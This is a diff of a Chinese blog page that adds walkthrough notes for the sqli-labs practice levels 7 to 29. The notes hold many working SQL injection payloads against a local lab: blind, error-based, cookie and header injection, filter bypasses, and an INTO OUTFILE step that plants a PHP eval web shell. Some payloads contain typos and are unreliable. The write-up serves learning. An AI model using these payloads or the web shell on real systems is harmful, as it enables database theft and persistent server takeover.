@@ -25,11 +25,13 @@
 <meta property="og:site_name" content="叶子的博客">
 <meta property="og:description" content="1.less-1">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/sql-lib/z3eZq.png">
 <meta property="article:published_time" content="2022-05-23T11:48:59.000Z">
-<meta property="article:modified_time" content="2022-05-24T04:59:40.941Z">
+<meta property="article:modified_time" content="2022-06-08T02:23:19.316Z">
 <meta property="article:author" content="leaf">
 <meta property="article:tag" content="sql学习">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/sql-lib/z3eZq.png">
   <!-- Canonical links -->
   <link rel="canonical" href="http://example.com/2022/05/23/sql-lib/index.html">
   
@@ -223,7 +225,7 @@
   <div class="widget">
     <h3 class="widget-title">归档</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">3</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -235,21 +237,6 @@
     <div class="widget-body">
       <ul class="recent-post-list list-unstyled no-thumbnail">
         
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                
-              </p>
-              <p class="item-title">
-                <a href="/2022/05/24/%E8%B6%B3%E7%90%83/" class="title">足球</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2022-05-24T05:24:33.000Z" itemprop="datePublished">2022-05-24</time>
-              </p>
-            </div>
-          </li>
-          
           <li>
             
             <div class="item-inner">
@@ -332,10 +319,10 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/05/23/sql-lib/#comments" class="article-comment-link">评论</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.2k(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3.9k(字)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 5(分)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 17(分)</span>
 	
 
       </div>
@@ -446,7 +433,258 @@
 <h1 id="6-less-6"><a href="#6-less-6" class="headerlink" title="6. less-6"></a>6. less-6</h1><p>基于双引号的盲注</p>
 <p>只需要以双引号闭合即可</p>
 <hr>
-<h1 id="7-less-7"><a href="#7-less-7" class="headerlink" title="7.less-7"></a>7.less-7</h1>
+<h1 id="7-less-7"><a href="#7-less-7" class="headerlink" title="7.less-7"></a>7.less-7</h1><p>基于单引号和两个括号的闭合</p>
+<p>这里查看源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>这里只要**’))**进行闭合</p>
+<p>然后发现这里无论如何都不会报错同时在提示into outfile</p>
+<p>所以想到上传文件</p>
+<p>这里就使用上传文件方法要知道绝对路径，对WEB目录具有读权限</p>
+<p>判断是否有读写权限:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select cout(*) from mysql.user)&gt;0--+</span><br></pre></td></tr></table></figure>
+
+<p>如果返回正常则说明具有读写的权限</p>
+<p>实战中这里我么那就需要通过盲注取猜测绝对路径：</p>
+<p>（1）猜测路径的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length(@@datadir)=10--+</span><br></pre></td></tr></table></figure>
+
+<p>这里datadir是指数据文件存储位置</p>
+<p>(2)然后根据长度进行每个字符猜测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr(@@datadir,1,1))=10--+</span><br></pre></td></tr></table></figure>
+
+<p>以此类推就可以获得路径</p>
+<p>知道绝对路径之后就采用into outfile写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=1%27))%20union%20select%201,2,%27%3C?php%20@eval($_POST[%22123%22])?%3E%27%20into%20outfile%20%22E:\\software\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\1.php%22--+</span><br></pre></td></tr></table></figure>
+
+<p>之后再利用连接工具连接即可</p>
+<hr>
+<h1 id="8-less-8"><a href="#8-less-8" class="headerlink" title="8.less-8"></a>8.less-8</h1><p>单引号闭合的盲注</p>
+<p>这里加入单引号后发现闭合</p>
+<p>这里因为没有报错回显所以就想到利用延迟来判断</p>
+<p>然后通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(1),sleep(2))--+</span><br></pre></td></tr></table></figure>
+
+<p>判断第一个数据库的字符为s以此类推就可以推测出其他字符</p>
+<hr>
+<h1 id="9-less-9"><a href="#9-less-9" class="headerlink" title="9.less-9"></a>9.less-9</h1><p>该题也是利用到了时间盲注</p>
+<p>与上关卡相似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli-labs-master/Less-9/?id=1%27%20and%20if(substr(database(),1,1)=%27s%27,sleep(5),sleep(1))--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="10-less-10"><a href="#10-less-10" class="headerlink" title="10.less-10"></a>10.less-10</h1><p>基于双引号闭合的时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-10/?id=1%22%20and%20if(substr(database(),1,1)=%27s%27,sleep(5),sleep(1))--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="11-less-1"><a href="#11-less-1" class="headerlink" title="11.less-1"></a>11.less-1</h1><p>基于post的联合注入</p>
+<p>这里发现无论输入什么都url中都没有变化所以判断其为post型</p>
+<p>先输入admin ‘，123456尝试发现是单引号闭合</p>
+<p>之后便通过联合注入便可以获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1admin&#x27; union select 1，database()#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1admin&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security#&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1admin&#x27; union select (select grop_concat(column_name) from information)schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p>后面就不进行列举</p>
+<hr>
+<h1 id="12less-12"><a href="#12less-12" class="headerlink" title="12less-12"></a>12less-12</h1><p>“）闭合post注入</p>
+<p>于less11一致就不多说</p>
+<hr>
+<h1 id="13-less-13"><a href="#13-less-13" class="headerlink" title="13.less-13"></a>13.less-13</h1><p>‘)闭合post型报错注入</p>
+<p>通过order by判断出有2个字段数</p>
+<p>但是发现没有回显所以就考虑报错注入和盲注</p>
+<p>这里以报错为例</p>
+<p>（1）数据库爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1admin&#x27;) union select 1,updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>(2)报表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1admin&#x27;) union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>以此继续爆破即可</p>
+<hr>
+<h1 id="14-less-14"><a href="#14-less-14" class="headerlink" title="14.less-14"></a>14.less-14</h1><p>双引号的post型报错注入</p>
+<p>这里的闭合方式为**”**其余便于上一题一致</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin1&quot; union select 1,updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="15-less-5"><a href="#15-less-5" class="headerlink" title="15.less-5"></a>15.less-5</h1><p>单引号闭合的时间注入</p>
+<p>发现报错语句也没有只能考虑时间注入了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and sleep(10)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(2),1)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>以此类推得出数据</p>
+<hr>
+<h1 id="16-less-6"><a href="#16-less-6" class="headerlink" title="16.less-6"></a>16.less-6</h1><p>双引号闭合的时间注入</p>
+<p>于上题一致</p>
+<hr>
+<h1 id="17-less-17"><a href="#17-less-17" class="headerlink" title="17.less-17"></a>17.less-17</h1><p>这里对账号进行了限制需要知道真实账号的前提下对密码进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="18-less-18"><a href="#18-less-18" class="headerlink" title="18.less-18"></a>18.less-18</h1><p>对于user-agent的注入</p>
+<p>这道题放下你对账号密码进行测试都没有报错猜测对账号密码都进行了转义查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&#x27;uname&#x27;]);</span><br><span class="line">$passwd = check_input($_POST[&#x27;passwd&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>确实都进行了过滤</p>
+<p>所以就考虑在其他地方进行注入然后再源码中发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后输入admin和admin发现回显了user-agent所以猜测是user-agent出的注入，同时发现通过<strong>‘</strong>实现了闭合</p>
+<p>看到大佬文章发现这里通过源码看出执行qsl的语句时insert，insert插入的表中字段中包含了uagent，ip_address和username三个字段说一在value中也应该匹配才行，所以需要一个完整闭合进而不影响后续两个value值所以输入and ‘1’&#x3D;’1即可</p>
+<p>查看版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>查看数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>后面就与之前都一致进行注入获取数据即可</p>
+<hr>
+<h1 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h1><p>对referer的注入</p>
+<p>这里只是变为了对referer的注入其他都没有变化都不多说</p>
+<hr>
+<h1 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h1><p>对cookie的注入</p>
+<p>这里抓包发现有两个包一个get包一个post包且两个返回的不同</p>
+<p>先通过post提交然后获取uname值并赋值给cookie在进行get提交</p>
+<p>所以这里直接在get包中cookie进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><hr>
+<p>基于base64编码后的cookie注入</p>
+<p>查看源码发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>发现这里对传入值进行了base64的编码所以我们在注入式也需要进行base64编码（注入语句都一致编码即可）</p>
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>双引号闭合基于cookie的base64型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = &#x27;&quot;&#x27;. $cookee. &#x27;&quot;&#x27;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>通过源代码分析发现该题是通过双引号进行闭合</p>
+<p>原句为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>base64进行加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw==</span><br></pre></td></tr></table></figure>
+
+<h2 id="这里存在疑问为什么上一道会有’1’-x3D-’1进行闭合而这道并不需要这样闭合"><a href="#这里存在疑问为什么上一道会有’1’-x3D-’1进行闭合而这道并不需要这样闭合" class="headerlink" title="这里存在疑问为什么上一道会有’1’&#x3D;’1进行闭合而这道并不需要这样闭合"></a>这里存在疑问为什么上一道会有’1’&#x3D;’1进行闭合而这道并不需要这样闭合</h2><hr>
+<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>url终止符%00注入</p>
+<p>查看源码发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = &quot;/#/&quot;;</span><br><span class="line">$reg1 = &quot;/--/&quot;;</span><br><span class="line">$replace = &quot;&quot;;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure>
+
+<p>将reg和reg1切换为replace</p>
+<p>即将#和–置空所以我们这里就需要用%00来代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,database();%00</span><br></pre></td></tr></table></figure>
+
+<p>其余都一致</p>
+<hr>
+<h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>二次注入</p>
+<p>二次注入就是构造的恶意数据存储在数据库，恶意数据被读取并进入道sql查询语句中</p>
+<h2 id="二次注入的步骤"><a href="#二次注入的步骤" class="headerlink" title="二次注入的步骤"></a>二次注入的步骤</h2><p>(1)插入恶意数据进入数据库插入数据时，对其中的特殊字符进行了转义处理，再写入数据库的时候又保留了原来的数据</p>
+<p>(2)引用恶意数据（在进行查询时直接从数据库中取出恶意数据没有进行进一步的检验的处理）</p>
+<p>这里运用的漏洞就是</p>
+<p>后端（PHP）代码对语句进行了转义</p>
+<p>保存进数据库（mysql）时没有转义是原语句</p>
+<p>1）这里我们注册一个admin’#的账号</p>
+<p>2）后端会对其进行转义变为其他东西导致第一次注入没有作用</p>
+<p>3）但是之后保存进数据库是会原样保存为admin’#</p>
+<p>修改密码的语句就为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&#x27;123456&#x27; where uername=&#x27;admin&#x27;#&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出虽然修改的admin’#的密码但是其实在数据库中更改的时admin的密码</p>
+<hr>
+<h1 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h1><p>重复注入</p>
+<p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);		</span><br><span class="line">$id= preg_replace(&#x27;/AND/i&#x27;,&quot;&quot;, $id);</span><br></pre></td></tr></table></figure>
+
+<p>发现or和and都被替换</p>
+<p>测试发现**’**闭合成功开始注入</p>
+<p>(1)判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20oorrder%20by%203--+</span><br></pre></td></tr></table></figure>
+
+<p>(2)判断回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>(3)开脱</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
+
+<p>这里还可以采用报错注入的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; anandd updatexml(1,concat(0x7e,database(),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>查看源码发现除了对and和or的转义以外</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里都没有单引号所以直接开注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里由于不存在报错回显所以不能是用报错注入</p>
+<hr>
+<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);			</span><br><span class="line">$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);		</span><br><span class="line">$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);	</span><br><span class="line">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);		</span><br><span class="line">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);		</span><br><span class="line">$id= preg_replace(&#x27;/[\s]/&#x27;,&quot;&quot;, $id);		</span><br><span class="line">$id= preg_replace(&#x27;/[\/\\\\]/&#x27;,&quot;&quot;, $id);		</span><br></pre></td></tr></table></figure>
+
+<p>发现对一些字符进行了过滤</p>
+<p>上网查看一般绕过空格过滤的有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1)/**/</span><br><span class="line">(2)()</span><br><span class="line">(3)%0a</span><br><span class="line">(4)`</span><br><span class="line">(5)tap</span><br><span class="line">(6)两个空格</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我们可以用%00代替#，用%a0代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1111%27%a0union%a0select%a01,2,database();%00</span><br></pre></td></tr></table></figure>
+
+<p>以此类推进行爆出其他内容</p>
+<p>此外则例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(&#x27;$&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h1 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h1><p>于26题一样只是闭合多了一个括号</p>
+<p>但是这道题由于没有报错所以不能使用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%27)%a0union%a0select%a01,2,database();%00</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h1><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id);	    //Strip out select</span><br></pre></td></tr></table></figure>
+
+<p>union和select都被过滤所以考虑使用报错并采用大小写或者重复绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(0x7e,(seleCt database()),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h1><p>同上一个不同的只有变成了双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;UnIon%0ASelecT%0A1,database(),3%0A||&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h1><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);				//strip out /*</span><br><span class="line">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);				//Strip out --.</span><br><span class="line">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);					//Strip out #.</span><br><span class="line">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="line">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/union\s+select/i&#x27;,&quot;&quot;, $id);	    //Strip out UNION &amp; SELECT.</span><br></pre></td></tr></table></figure>
+
+<p>发现对union+一个或多个空格+select进行了过滤</p>
+<p>采用重复写进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;)%0Aunion%0Aunion%0Aselectselect%0A1,database(),3||&#x27;1&#x27;=(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h1><p>于28一致</p>
+<hr>
+<h1 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>发现跳转存在waf</p>
+<p>通过大佬文章知道</p>
+<p>服务器端有两个部分:第一个部分为tomcat为引擎的jsp型服务器，第二部分是apache为引擎的php服务器，真正提供web服务的是php服务器</p>
+<p><img src="/sql-lib/z3eZq.png" alt="z3eZq.png">对于参数解析问题:</p>
+<p>PHP&#x2F;Apache 解析参数为最后一个</p>
+<p>JSP&#x2F;Tomcat   解析参数是第一个</p>
+<p>Perl&#x2F;Apache  解析参数是第一个</p>
+<p>python&#x2F;Apache 解析参数是全部</p>
+<p>ASP&#x2F;IIS            解析参数是全部</p>
+
       
     </div>
     <div class="article-footer">
@@ -500,10 +738,6 @@
   <div class="bar-inner">
   
   <ul class="pager pull-left">
-    
-    <li class="prev">
-      <a href="/2022/05/24/%E8%B6%B3%E7%90%83/" title="足球"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
     
     
     <li class="next">
